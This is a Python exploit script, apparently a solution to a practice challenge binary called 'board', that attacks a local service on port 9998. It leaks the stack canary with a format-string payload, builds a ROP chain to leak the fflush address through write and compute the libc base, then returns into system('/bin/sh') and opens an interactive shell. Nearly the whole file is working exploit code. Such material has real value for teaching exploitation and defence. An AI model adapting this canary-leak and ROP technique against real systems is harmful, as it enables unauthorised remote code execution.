'''
Buffer overflow for board.c
Full writeup at https://matthewlevydev.com/2019/01/17/exploitchallenge1/
'''

import struct
import socket
import time
import telnetlib

HOST = ("localhost", 9998)

OFFSET = 312

# From disassembly
POP_RDI_RSI_RDX     = 0x40076a
WRITE_PLT           = 0x4005f0
CREATE_MEMO_ADDRESS = 0x400771

# objdump -R board | grep fflush
FFLUSH_GOT          = 0x601fe8

# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep fflush
FFLUSH_OFFSET       = 0x06d7a0

# Using peda
BIN_SH_OFFSET       = 0x18cd57
SYSTEM_OFFSET       = 0x45390

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(HOST)
	return s

def recvUntil(s, data):
	buf = s.recv(len(data))
	while buf != data:
		buf = buf[1:] + s.recv(1)

def asciiToHex(data):                                                                                                                                                   
	ret = ''
	while data:
		ret = chr(int(data[0:2], 16)) + ret
		data = data[2:]
	
	return ret

def buildBufferOverflow(cookie, data):
	exploit = ''
	exploit += '\x41' * OFFSET
	exploit += cookie
	exploit += data
	return exploit

def leakStackCanary(s):
	# Create a new memo
	s.send('1\n')
	s.send('COOKIE [%7$p]\n')  # Title
	s.send('body\n')           # Body
	
	# Display Memo
	s.send('3\n')
	s.send('-1\n')
	recvUntil(s, 'COOKIE [0x')
	cookie = s.recv(15)
	s.recv(1024)
	
	return cookie

def leakFFlushAddress(s, cookie):
	# Select createMemo
	s.send('1\n')
	
	# Build ROP Chain
	rop_chain = ''
	rop_chain += struct.pack('<Q', POP_RDI_RSI_RDX)
	rop_chain += struct.pack('<Q', 1)
	rop_chain += struct.pack('<Q', FFLUSH_GOT)
	rop_chain += struct.pack('<Q', 8)
	rop_chain += struct.pack('<Q', WRITE_PLT)
	rop_chain += struct.pack('<Q', CREATE_MEMO_ADDRESS)
	
	# Build exploit
	exploit = 'B' * 8 + rop_chain
	exploit = buildBufferOverflow(cookie, exploit)
	
	# Send overflow
	s.send(exploit + '\n')
	s.send('body\n')
	
	recvUntil(s, 'Body: ')
	
	# Just to make sure that we aren't moving too fast
	time.sleep(0.25)
	
	addr = s.recv(8)
	return struct.unpack('<Q', addr)[0]

def getShell(s, cookie, libc_base):
	# Create ROP Chain
	rop_chain = ''
	rop_chain += struct.pack('<Q', POP_RDI_RSI_RDX) # We could find a POP RDI gadget,
							# or just reuse this one and add
							# dummy data to pop
	rop_chain += struct.pack('<Q', libc_base + BIN_SH_OFFSET)
	rop_chain += struct.pack('<QQ', 1, 1) # Dummy data
	rop_chain += struct.pack('<Q', libc_base + SYSTEM_OFFSET)
	
	exploit = 'B' * 8 + rop_chain
	exploit = buildBufferOverflow(cookie, exploit)
	
	s.send(exploit + '\n')
	s.send('body\n')
	
	recvUntil(s, 'Body: ')

# Connect to the server
s = connect()

# Leak the stack cookie
cookie = leakStackCanary(s)
print 'Cookie Found: %s' % cookie
cookie = asciiToHex(cookie)

fflush_address = leakFFlushAddress(s, cookie)
print 'FFlush Address: %s' % hex(fflush_address)

libc_base = fflush_address - FFLUSH_OFFSET
print 'Libc Base Address: %s' % hex(libc_base)

getShell(s, cookie, libc_base)

t = telnetlib.Telnet()
t.sock = s
t.interact()
